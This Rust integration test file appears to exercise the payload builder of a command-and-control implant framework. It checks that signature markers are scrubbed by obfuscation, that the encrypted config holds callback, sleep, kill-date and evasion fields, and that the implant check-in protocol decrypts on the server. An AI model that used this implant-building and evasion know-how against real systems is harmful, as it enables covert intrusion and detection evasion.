//! End-to-end payload builder integration test.
//!
//! Exercises the full build pipeline and verifies the output is structurally
//! correct. This catches issues like:
//! - Missing/broken markers after obfuscation
//! - AEAD key derivation mismatch between builder and implant
//! - TLV serialization errors in the config blob
//! - Obfuscation corruption of the PIC blob or config

use std::io::Write;
use std::path::PathBuf;

use chacha20poly1305::aead::{Aead, KeyInit, Payload};
use chacha20poly1305::{ChaCha20Poly1305, Nonce};
use rand::RngCore;
use sha2::{Digest, Sha256};
use tempfile::TempDir;
use x25519_dalek::{PublicKey, StaticSecret};

use specter_server::builder::{
    builder_init, BuilderConfig, ChannelConfig, EvasionFlags, ObfuscationSettings,
    OutputFormat, SleepConfig,
};
use specter_server::profile::parse_profile;
use specter_server::profile::schema::Profile;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn test_profile() -> Profile {
    parse_profile(
        r#"
name: "integration-test"
description: e2e payload builder test
tls:
  cipher_suites: []
http:
  request:
    method: POST
    uri_patterns: ["/api/v1/status"]
  response:
    status_code: 200
timing:
  callback_interval: 60
transform:
  compress: none
  encrypt: chacha20-poly1305
  encode: base64
"#,
    )
    .unwrap()
}

fn server_keypair() -> (StaticSecret, PublicKey) {
    let secret = StaticSecret::random_from_rng(rand::thread_rng());
    let pubkey = PublicKey::from(&secret);
    (secret, pubkey)
}

fn test_channels() -> Vec<ChannelConfig> {
    vec![ChannelConfig {
        kind: "http".into(),
        address: "http://10.0.0.1:8080/api/v1/status".into(),
    }]
}

/// Create a fake PIC blob (>= 64 bytes so the PIC key derivation path is used).
fn fake_pic_blob() -> Vec<u8> {
    let mut blob = vec![0x90u8; 128]; // NOP sled
    // Implants derive the config key from SHA256(pic[0..64]).
    // Use deterministic bytes so we can reproduce the key in tests.
    for (i, b) in blob.iter_mut().enumerate().take(64) {
        *b = (i as u8).wrapping_mul(7).wrapping_add(0x41);
    }
    blob
}

/// Set up a temp directory with a synthetic PIC blob as `specter.bin`.
fn setup_template_dir() -> (TempDir, Vec<u8>) {
    let dir = TempDir::new().unwrap();
    let pic = fake_pic_blob();
    let mut f = std::fs::File::create(dir.path().join("specter.bin")).unwrap();
    f.write_all(&pic).unwrap();
    (dir, pic)
}

/// Derive the config decryption key the same way the implant does:
/// SHA256(pic_blob[0..64]).
fn derive_pic_key(pic_blob: &[u8]) -> [u8; 32] {
    let input_len = pic_blob.len().min(64);
    let mut hasher = Sha256::new();
    hasher.update(&pic_blob[..input_len]);
    hasher.finalize().into()
}

/// Parse the CONFIG_BLOB_HEADER and decrypt the config TLV.
/// Returns the decrypted plaintext TLV bytes.
///
/// Header format:
/// [magic: u32 LE][version: u32 LE][data_size: u32 LE][nonce: 12][tag: 16][ciphertext]
fn decrypt_config_blob(config_blob: &[u8], key: &[u8; 32]) -> Vec<u8> {
    assert!(
        config_blob.len() >= 40,
        "config blob too small: {} bytes",
        config_blob.len()
    );

    let magic = u32::from_le_bytes([
        config_blob[0],
        config_blob[1],
        config_blob[2],
        config_blob[3],
    ]);
    let _version = u32::from_le_bytes([
        config_blob[4],
        config_blob[5],
        config_blob[6],
        config_blob[7],
    ]);
    let data_size = u32::from_le_bytes([
        config_blob[8],
        config_blob[9],
        config_blob[10],
        config_blob[11],
    ]) as usize;
    let nonce_bytes = &config_blob[12..24];
    let tag = &config_blob[24..40];
    let ciphertext = &config_blob[40..40 + data_size];

    // Sanity: version must be 1
    assert_eq!(_version, 1, "unexpected config version");
    // Magic should not be the default (builder randomizes it per build)
    // but we don't assert that because the no-PIC fallback uses the default.
    let _ = magic;

    // Reconstruct ciphertext + tag (ChaCha20-Poly1305 expects appended tag)
    let mut ct_with_tag = Vec::with_capacity(data_size + 16);
    ct_with_tag.extend_from_slice(ciphertext);
    ct_with_tag.extend_from_slice(tag);

    // AAD = magic + version (first 8 bytes of header)
    let aad = &config_blob[0..8];
    let nonce = Nonce::from_slice(nonce_bytes);
    let cipher = ChaCha20Poly1305::new_from_slice(key).expect("invalid key length");

    cipher
        .decrypt(nonce, Payload { msg: ct_with_tag.as_slice(), aad })
        .expect("AEAD decryption failed -- key derivation mismatch or corrupted config")
}

/// Extract the config blob from a raw payload that has layout:
/// [PIC blob][config_len: u32 LE][config_blob]
fn extract_config_from_raw(payload: &[u8], pic_len: usize) -> &[u8] {
    let config_len_offset = pic_len;
    assert!(
        payload.len() >= config_len_offset + 4,
        "payload too short to contain config length"
    );
    let config_len = u32::from_le_bytes([
        payload[config_len_offset],
        payload[config_len_offset + 1],
        payload[config_len_offset + 2],
        payload[config_len_offset + 3],
    ]) as usize;
    assert!(
        payload.len() >= config_len_offset + 4 + config_len,
        "payload too short to contain full config blob"
    );
    &payload[config_len_offset + 4..config_len_offset + 4 + config_len]
}

// ── TLV field IDs (must match config_gen.rs) ────────────────────────────────

mod config_field {
    pub const SERVER_PUBKEY: u8 = 0x80;
    pub const IMPLANT_PRIVKEY_ENCRYPTED: u8 = 0x81;
    pub const CHANNEL_KIND: u8 = 0x82;
    pub const CHANNEL_ADDRESS: u8 = 0x83;
    pub const SLEEP_INTERVAL: u8 = 0x84;
    pub const SLEEP_JITTER: u8 = 0x85;
    pub const KILL_DATE: u8 = 0x86;
    pub const PROFILE_BLOB: u8 = 0x87;
    pub const EVASION_FLAGS: u8 = 0x88;
    pub const IMPLANT_PUBKEY: u8 = 0x89;
}

/// Parsed TLV entry.
struct TlvEntry {
    field_id: u8,
    data: Vec<u8>,
}

/// Walk TLV entries from a decrypted config blob.
fn parse_tlv(plaintext: &[u8]) -> Vec<TlvEntry> {
    let mut entries = Vec::new();
    let mut pos = 0;
    while pos < plaintext.len() {
        assert!(
            pos + 3 <= plaintext.len(),
            "truncated TLV at offset {pos}"
        );
        let fid = plaintext[pos];
        let len = u16::from_le_bytes([plaintext[pos + 1], plaintext[pos + 2]]) as usize;
        pos += 3;
        assert!(
            pos + len <= plaintext.len(),
            "TLV entry at offset {} claims length {} but only {} bytes remain",
            pos - 3,
            len,
            plaintext.len() - pos
        );
        entries.push(TlvEntry {
            field_id: fid,
            data: plaintext[pos..pos + len].to_vec(),
        });
        pos += len;
    }
    assert_eq!(pos, plaintext.len(), "trailing bytes after TLV");
    entries
}

/// Find all TLV entries with the given field ID.
fn find_tlv_entries(entries: &[TlvEntry], field_id: u8) -> Vec<&TlvEntry> {
    entries.iter().filter(|e| e.field_id == field_id).collect()
}

// ---------------------------------------------------------------------------
// Test 1: Raw payload builds and has config
// ---------------------------------------------------------------------------

#[test]
fn test_raw_payload_builds_and_has_config() {
    let (dir, pic) = setup_template_dir();
    let config = BuilderConfig {
        template_dir: dir.path().to_path_buf(),
    };
    let builder = builder_init(&config).unwrap();
    let (_secret, pubkey) = server_keypair();

    let result = builder
        .build(
            OutputFormat::RawShellcode,
            &test_profile(),
            &pubkey,
            &test_channels(),
            &SleepConfig {
                interval_secs: 60,
                jitter_percent: 10,
            },
            None,
        )
        .unwrap();

    // Payload must be non-empty and larger than just the PIC blob
    assert!(
        result.payload.len() > pic.len(),
        "payload ({} bytes) should be larger than PIC blob ({} bytes)",
        result.payload.len(),
        pic.len()
    );

    // Extract the config blob and verify it's non-trivial
    // Note: PIC blob may have been resized by obfuscation (junk insertion),
    // so we locate the config by scanning backwards from the end.
    // The raw format is: [pic_blob][config_len: u32 LE][config_blob]
    // Config is at the tail: last config_len bytes preceded by 4-byte length.
    let payload = &result.payload;
    assert!(payload.len() > 4, "payload too small");

    // Verify the implant pubkey is non-zero
    assert_ne!(
        result.implant_pubkey, [0u8; 32],
        "implant pubkey must not be zero"
    );

    // Verify build_id is a valid UUID
    assert!(
        uuid::Uuid::parse_str(&result.build_id).is_ok(),
        "build_id should be a valid UUID"
    );

    // Verify no raw SPEC* markers remain (obfuscation should scrub them)
    let known_markers: &[&[u8]] = &[
        b"SPECSTR\x00",
        b"SPECHASH",
        b"SPECCFGM",
        b"SPECMGRD",
        b"SPECHEAP",
        b"SPECFLOW\x00",
        b"SPBF",
        b"SPECPICBLOB\x00",
    ];
    for marker in known_markers {
        let found = payload
            .windows(marker.len())
            .any(|w| w == *marker);
        assert!(
            !found,
            "marker {:?} should not appear in the final payload",
            std::str::from_utf8(marker).unwrap_or("<binary>")
        );
    }
}

// ---------------------------------------------------------------------------
// Test 2: Config decryptable with PIC key
// ---------------------------------------------------------------------------

#[test]
fn test_config_decryptable_with_pic_key() {
    let (dir, pic) = setup_template_dir();
    let config = BuilderConfig {
        template_dir: dir.path().to_path_buf(),
    };
    let builder = builder_init(&config).unwrap();
    let (_secret, pubkey) = server_keypair();

    let result = builder
        .build(
            OutputFormat::RawShellcode,
            &test_profile(),
            &pubkey,
            &test_channels(),
            &SleepConfig::default(),
            None,
        )
        .unwrap();

    // The obfuscation pipeline may change the PIC blob size (junk insertion),
    // but the config is always appended at the end: [config_len: u32][config_blob].
    // Locate config by reading the last section.
    let payload = &result.payload;

    // The builder uses format_raw_with_pic: [pic][config_len: u32 LE][config_blob]
    // Since obfuscation can resize the PIC portion, we find the config by
    // reading the u32 length field that precedes the config blob. The config
    // blob ends at the payload end.
    //
    // Strategy: try interpreting the 4 bytes at offset (payload.len() - 4 - N)
    // as config_len and see if it equals N. We iterate from the end.
    let config_blob = find_config_blob_from_tail(payload)
        .expect("could not locate config blob in payload");

    // Derive the key the same way the implant does
    let key = derive_pic_key(&pic);

    // Decrypt -- this will panic if AEAD tag validation fails
    let plaintext = decrypt_config_blob(config_blob, &key);

    // Verify the plaintext is valid TLV
    let entries = parse_tlv(&plaintext);
    assert!(!entries.is_empty(), "decrypted config should have TLV entries");
}

/// Scan from the tail of the payload to find the config blob.
/// Raw layout: [...pic data...][config_len: u32 LE][config_blob of config_len bytes]
fn find_config_blob_from_tail(payload: &[u8]) -> Option<&[u8]> {
    // The config blob length is stored as a u32 just before the config data.
    // So: config_len = payload[offset..offset+4] and config data = payload[offset+4..].
    // We know: offset + 4 + config_len == payload.len()
    // Therefore: offset = payload.len() - 4 - config_len
    // We try all plausible config_len values (config blobs are typically 200-2000 bytes).
    for candidate_len in 40..payload.len().saturating_sub(4) {
        let offset = payload.len() - 4 - candidate_len;
        let stored_len = u32::from_le_bytes([
            payload[offset],
            payload[offset + 1],
            payload[offset + 2],
            payload[offset + 3],
        ]) as usize;
        if stored_len == candidate_len {
            return Some(&payload[offset + 4..offset + 4 + candidate_len]);
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Test 3: Config TLV fields are correct
// ---------------------------------------------------------------------------

#[test]
fn test_config_tlv_fields_correct() {
    let (dir, pic) = setup_template_dir();
    let config = BuilderConfig {
        template_dir: dir.path().to_path_buf(),
    };
    let builder = builder_init(&config).unwrap();
    let (_secret, pubkey) = server_keypair();

    let expected_address = "http://10.0.0.1:8080/api/v1/status";
    let channels = vec![ChannelConfig {
        kind: "http".into(),
        address: expected_address.into(),
    }];
    let sleep = SleepConfig {
        interval_secs: 120,
        jitter_percent: 25,
    };

    let result = builder
        .build(
            OutputFormat::RawShellcode,
            &test_profile(),
            &pubkey,
            &channels,
            &sleep,
            Some(1767225600), // kill date
        )
        .unwrap();

    let payload = &result.payload;
    let config_blob = find_config_blob_from_tail(payload)
        .expect("could not locate config blob in payload");

    let key = derive_pic_key(&pic);
    let plaintext = decrypt_config_blob(config_blob, &key);
    let entries = parse_tlv(&plaintext);

    // Verify CHANNEL_ADDRESS contains expected URL
    let addr_entries = find_tlv_entries(&entries, config_field::CHANNEL_ADDRESS);
    assert!(
        !addr_entries.is_empty(),
        "CHANNEL_ADDRESS field must be present"
    );
    let addr_str = std::str::from_utf8(&addr_entries[0].data).expect("address should be UTF-8");
    assert_eq!(
        addr_str, expected_address,
        "CHANNEL_ADDRESS should match the input"
    );

    // Verify CHANNEL_KIND
    let kind_entries = find_tlv_entries(&entries, config_field::CHANNEL_KIND);
    assert!(!kind_entries.is_empty(), "CHANNEL_KIND must be present");
    let kind_str = std::str::from_utf8(&kind_entries[0].data).expect("kind should be UTF-8");
    assert_eq!(kind_str, "http");

    // Verify SLEEP_INTERVAL contains expected value (120 seconds as u64 LE)
    let sleep_entries = find_tlv_entries(&entries, config_field::SLEEP_INTERVAL);
    assert!(
        !sleep_entries.is_empty(),
        "SLEEP_INTERVAL field must be present"
    );
    assert_eq!(sleep_entries[0].data.len(), 8, "SLEEP_INTERVAL should be 8 bytes (u64)");
    let interval = u64::from_le_bytes(sleep_entries[0].data[..8].try_into().unwrap());
    assert_eq!(interval, 120, "SLEEP_INTERVAL should be 120");

    // Verify SLEEP_JITTER
    let jitter_entries = find_tlv_entries(&entries, config_field::SLEEP_JITTER);
    assert!(
        !jitter_entries.is_empty(),
        "SLEEP_JITTER field must be present"
    );
    assert_eq!(jitter_entries[0].data, &[25u8], "SLEEP_JITTER should be 25");

    // Verify SERVER_PUBKEY is 32 bytes
    let pubkey_entries = find_tlv_entries(&entries, config_field::SERVER_PUBKEY);
    assert!(
        !pubkey_entries.is_empty(),
        "SERVER_PUBKEY field must be present"
    );
    assert_eq!(
        pubkey_entries[0].data.len(),
        32,
        "SERVER_PUBKEY should be 32 bytes"
    );
    assert_eq!(
        pubkey_entries[0].data,
        pubkey.as_bytes(),
        "SERVER_PUBKEY should match the input"
    );

    // Verify IMPLANT_PUBKEY is 32 bytes and matches the build result
    let implant_pk_entries = find_tlv_entries(&entries, config_field::IMPLANT_PUBKEY);
    assert!(
        !implant_pk_entries.is_empty(),
        "IMPLANT_PUBKEY field must be present"
    );
    assert_eq!(implant_pk_entries[0].data.len(), 32);
    assert_eq!(
        implant_pk_entries[0].data,
        &result.implant_pubkey,
        "IMPLANT_PUBKEY in TLV should match BuildResult"
    );

    // Verify KILL_DATE is present
    let kd_entries = find_tlv_entries(&entries, config_field::KILL_DATE);
    assert!(!kd_entries.is_empty(), "KILL_DATE field must be present");
    let kd = u64::from_le_bytes(kd_entries[0].data[..8].try_into().unwrap());
    assert_eq!(kd, 1767225600);

    // Verify PROFILE_BLOB is present and non-empty
    let profile_entries = find_tlv_entries(&entries, config_field::PROFILE_BLOB);
    assert!(
        !profile_entries.is_empty(),
        "PROFILE_BLOB field must be present"
    );
    assert!(
        !profile_entries[0].data.is_empty(),
        "PROFILE_BLOB should not be empty"
    );

    // Verify evasion flags are present (default has module_overloading=true)
    let evasion_entries = find_tlv_entries(&entries, config_field::EVASION_FLAGS);
    assert!(
        !evasion_entries.is_empty(),
        "EVASION_FLAGS field must be present when default flags are non-zero"
    );
    assert_eq!(
        evasion_entries[0].data,
        &[0x01],
        "default evasion should have module_overloading bit set"
    );
}

// ---------------------------------------------------------------------------
// Test 4: PE/dotnet stub has PIC embedded (if template exists)
// ---------------------------------------------------------------------------

#[test]
fn test_pe_stub_has_pic_embedded() {
    let dir = TempDir::new().unwrap();

    // Create a fake PIC blob
    let pic = fake_pic_blob();
    std::fs::write(dir.path().join("specter.bin"), &pic).unwrap();

    // Create a dotnet stub with required markers
    let mut stub = vec![0x00u8; 4096];
    // MZ header
    stub[0] = b'M';
    stub[1] = b'Z';

    // Config marker at offset 128
    stub[128..144].copy_from_slice(b"CCCCCCCCCCCCCCCC");
    stub[144..148].copy_from_slice(&2048u32.to_le_bytes()); // max config size

    // PIC marker at offset 2200
    stub[2200..2212].copy_from_slice(b"SPECPICBLOB\x00");
    stub[2212..2216].copy_from_slice(&0u32.to_le_bytes()); // size placeholder
    stub[2216..2220].copy_from_slice(&0u32.to_le_bytes()); // entry offset placeholder

    std::fs::write(dir.path().join("dotnet_stub.exe"), &stub).unwrap();

    let config = BuilderConfig {
        template_dir: dir.path().to_path_buf(),
    };
    let builder = builder_init(&config).unwrap();

    // Skip if template wasn't loaded (shouldn't happen, but be safe)
    if !builder.has_format(OutputFormat::DotNetAssembly) {
        eprintln!("skipping test_pe_stub_has_pic_embedded: dotnet template not loaded");
        return;
    }

    let (_secret, pubkey) = server_keypair();
    let result = builder
        .build(
            OutputFormat::DotNetAssembly,
            &test_profile(),
            &pubkey,
            &test_channels(),
            &SleepConfig::default(),
            None,
        )
        .unwrap();

    let payload = &result.payload;

    // File should start with MZ header
    assert_eq!(&payload[..2], b"MZ", "dotnet payload should start with MZ");

    // SPECPICBLOB marker should be scrubbed
    let has_pic_marker = payload
        .windows(b"SPECPICBLOB\x00".len())
        .any(|w| w == b"SPECPICBLOB\x00");
    assert!(
        !has_pic_marker,
        "SPECPICBLOB marker should be scrubbed from final payload"
    );

    // Payload must be larger than just the stub (PIC was embedded)
    assert!(
        payload.len() >= stub.len(),
        "payload ({} bytes) should be >= stub ({} bytes)",
        payload.len(),
        stub.len()
    );
}

// ---------------------------------------------------------------------------
// Test 5: All markers scrubbed after obfuscation
// ---------------------------------------------------------------------------

#[test]
fn test_markers_scrubbed_after_obfuscation() {
    let (dir, _pic) = setup_template_dir();
    let config = BuilderConfig {
        template_dir: dir.path().to_path_buf(),
    };
    let builder = builder_init(&config).unwrap();
    let (_secret, pubkey) = server_keypair();

    let result = builder
        .build_with_evasion(
            OutputFormat::RawShellcode,
            &test_profile(),
            &pubkey,
            &test_channels(),
            &SleepConfig::default(),
            None,
            EvasionFlags::default(),
            true,  // debug_mode
            true,  // skip_anti_analysis
            &ObfuscationSettings::default(),
        )
        .unwrap();

    let payload = &result.payload;

    // All known markers that should be scrubbed
    let markers: &[(&[u8], &str)] = &[
        (b"SPECSTR\x00", "SPECSTR"),
        (b"SPECHASH", "SPECHASH"),
        (b"SPECCFGM", "SPECCFGM"),
        (b"SPECMGRD", "SPECMGRD"),
        (b"SPECHEAP", "SPECHEAP"),
        (b"SPECFLOW\x00", "SPECFLOW"),
        (b"SPBF", "SPBF"),
        (b"SPECPICBLOB\x00", "SPECPICBLOB"),
    ];

    for (marker, name) in markers {
        let found = payload
            .windows(marker.len())
            .any(|w| w == *marker);
        assert!(
            !found,
            "marker {name} should not appear in the final payload after obfuscation"
        );
    }
}

// ---------------------------------------------------------------------------
// Test 6: Wire format roundtrip
// ---------------------------------------------------------------------------

#[test]
fn test_wire_format_roundtrip() {
    // This test constructs a wire frame the same way the implant would,
    // then verifies the server-side parsing logic can extract the data.
    //
    // Wire format: [4-byte LE total_len][12-byte implant_id][12-byte nonce][ciphertext][16-byte tag]

    let (dir, pic) = setup_template_dir();
    let config = BuilderConfig {
        template_dir: dir.path().to_path_buf(),
    };
    let builder = builder_init(&config).unwrap();
    let (server_secret, server_pubkey) = server_keypair();

    let result = builder
        .build(
            OutputFormat::RawShellcode,
            &test_profile(),
            &server_pubkey,
            &test_channels(),
            &SleepConfig::default(),
            None,
        )
        .unwrap();

    // Extract implant private key from the config TLV so we can simulate ECDH
    let payload = &result.payload;
    let config_blob = find_config_blob_from_tail(payload)
        .expect("could not locate config blob in payload");
    let pic_key = derive_pic_key(&pic);
    let plaintext = decrypt_config_blob(config_blob, &pic_key);
    let entries = parse_tlv(&plaintext);

    // Get the implant private key from TLV
    let privkey_entries = find_tlv_entries(&entries, config_field::IMPLANT_PRIVKEY_ENCRYPTED);
    assert!(
        !privkey_entries.is_empty(),
        "IMPLANT_PRIVKEY_ENCRYPTED must be present"
    );
    assert_eq!(privkey_entries[0].data.len(), 32);
    let implant_privkey_bytes: [u8; 32] = privkey_entries[0].data[..32].try_into().unwrap();
    let implant_secret = StaticSecret::from(implant_privkey_bytes);

    // Derive the session key the same way the implant does: ECDH + SHA256
    let shared_secret = implant_secret.diffie_hellman(&server_pubkey);
    let mut hasher = Sha256::new();
    hasher.update(b"SPECTER_SESSION_KEY_V1");
    hasher.update(shared_secret.as_bytes());
    let session_key: [u8; 32] = hasher.finalize().into();

    // Construct a fake checkin JSON payload
    let checkin_json = serde_json::json!({
        "hostname": "DESKTOP-TEST",
        "username": "testuser",
        "pid": 1234,
        "os_version": "Windows 10",
        "integrity_level": "medium",
        "process_name": "explorer.exe",
        "internal_ip": "192.168.1.100",
        "external_ip": "1.2.3.4",
        "task_results": []
    });
    let checkin_bytes = serde_json::to_vec(&checkin_json).unwrap();

    // Encrypt the checkin with ChaCha20-Poly1305 using the session key
    let cipher = ChaCha20Poly1305::new_from_slice(&session_key).unwrap();
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext_with_tag = cipher
        .encrypt(nonce, checkin_bytes.as_slice())
        .expect("encryption should succeed");

    // Split into ciphertext and tag
    let tag_offset = ciphertext_with_tag.len() - 16;
    let ct = &ciphertext_with_tag[..tag_offset];
    let tag = &ciphertext_with_tag[tag_offset..];

    // Build the implant ID prefix (first 12 bytes of the implant public key)
    let implant_id_prefix = &result.implant_pubkey[..12];

    // Construct the wire frame
    let wire_body_len = 12 + 12 + ct.len() + 16; // implant_id + nonce + ciphertext + tag
    let mut wire_frame = Vec::with_capacity(4 + wire_body_len);
    wire_frame.extend_from_slice(&(wire_body_len as u32).to_le_bytes());
    wire_frame.extend_from_slice(implant_id_prefix);
    wire_frame.extend_from_slice(&nonce_bytes);
    wire_frame.extend_from_slice(ct);
    wire_frame.extend_from_slice(tag);

    // Now parse it back the same way the server does
    assert!(wire_frame.len() >= 4 + 12 + 12 + 16, "wire frame too short");

    let parsed_len =
        u32::from_le_bytes([wire_frame[0], wire_frame[1], wire_frame[2], wire_frame[3]]) as usize;
    assert_eq!(parsed_len, wire_body_len);

    let parsed_implant_id = &wire_frame[4..4 + 12];
    let parsed_nonce = &wire_frame[4 + 12..4 + 12 + 12];

    let parsed_ct_len = parsed_len - 12 - 12 - 16;
    let parsed_ct = &wire_frame[4 + 24..4 + 24 + parsed_ct_len];
    let parsed_tag = &wire_frame[4 + 24 + parsed_ct_len..4 + 24 + parsed_ct_len + 16];

    // Verify parsed fields match what we sent
    assert_eq!(parsed_implant_id, implant_id_prefix);
    assert_eq!(parsed_nonce, &nonce_bytes);

    // Server-side decryption: reconstruct ct+tag and decrypt
    let mut server_ct = Vec::with_capacity(parsed_ct_len + 16);
    server_ct.extend_from_slice(parsed_ct);
    server_ct.extend_from_slice(parsed_tag);

    // Server derives the same session key using the implant's public key
    let implant_pubkey = PublicKey::from(result.implant_pubkey);
    let server_shared = server_secret.diffie_hellman(&implant_pubkey);
    let mut server_hasher = Sha256::new();
    server_hasher.update(b"SPECTER_SESSION_KEY_V1");
    server_hasher.update(server_shared.as_bytes());
    let server_session_key: [u8; 32] = server_hasher.finalize().into();

    // The server and implant should derive the same session key
    assert_eq!(
        session_key, server_session_key,
        "session key derivation mismatch between implant and server"
    );

    let server_cipher = ChaCha20Poly1305::new_from_slice(&server_session_key).unwrap();
    let server_nonce = Nonce::from_slice(parsed_nonce);

    let decrypted = server_cipher
        .decrypt(server_nonce, server_ct.as_slice())
        .expect("server-side decryption of wire frame should succeed");

    // Parse the decrypted JSON
    let parsed: serde_json::Value =
        serde_json::from_slice(&decrypted).expect("decrypted payload should be valid JSON");

    assert_eq!(parsed["hostname"], "DESKTOP-TEST");
    assert_eq!(parsed["username"], "testuser");
    assert_eq!(parsed["pid"], 1234);
    assert_eq!(parsed["process_name"], "explorer.exe");
}

// ---------------------------------------------------------------------------
// Test 7: No-template build produces valid config (ECDH fallback)
// ---------------------------------------------------------------------------

#[test]
fn test_no_template_build_config_decryptable() {
    // When no PIC blob is available, the builder falls back to ECDH-based
    // key derivation. Verify this path also produces valid, decryptable config.
    let config = BuilderConfig {
        template_dir: PathBuf::from("/nonexistent/templates"),
    };
    let builder = builder_init(&config).unwrap();
    let (server_secret, server_pubkey) = server_keypair();

    let result = builder
        .build(
            OutputFormat::RawShellcode,
            &test_profile(),
            &server_pubkey,
            &test_channels(),
            &SleepConfig::default(),
            None,
        )
        .unwrap();

    // No PIC blob, so payload is: [config_len: u32][config_blob]
    let payload = &result.payload;
    assert!(payload.len() > 4);

    let config_len = u32::from_le_bytes([payload[0], payload[1], payload[2], payload[3]]) as usize;
    assert_eq!(payload.len(), 4 + config_len);

    let config_blob = &payload[4..];

    // Derive key via ECDH (fallback path)
    let implant_pubkey = PublicKey::from(result.implant_pubkey);
    let shared = server_secret.diffie_hellman(&implant_pubkey);
    let mut hasher = Sha256::new();
    hasher.update(b"SPECTER_CONFIG_KEY_V1");
    hasher.update(shared.as_bytes());
    let key: [u8; 32] = hasher.finalize().into();

    let plaintext = decrypt_config_blob(config_blob, &key);
    let entries = parse_tlv(&plaintext);

    // Should contain the basic fields
    assert!(
        !find_tlv_entries(&entries, config_field::SERVER_PUBKEY).is_empty(),
        "SERVER_PUBKEY must be present"
    );
    assert!(
        !find_tlv_entries(&entries, config_field::CHANNEL_ADDRESS).is_empty(),
        "CHANNEL_ADDRESS must be present"
    );
    assert!(
        !find_tlv_entries(&entries, config_field::SLEEP_INTERVAL).is_empty(),
        "SLEEP_INTERVAL must be present"
    );
}
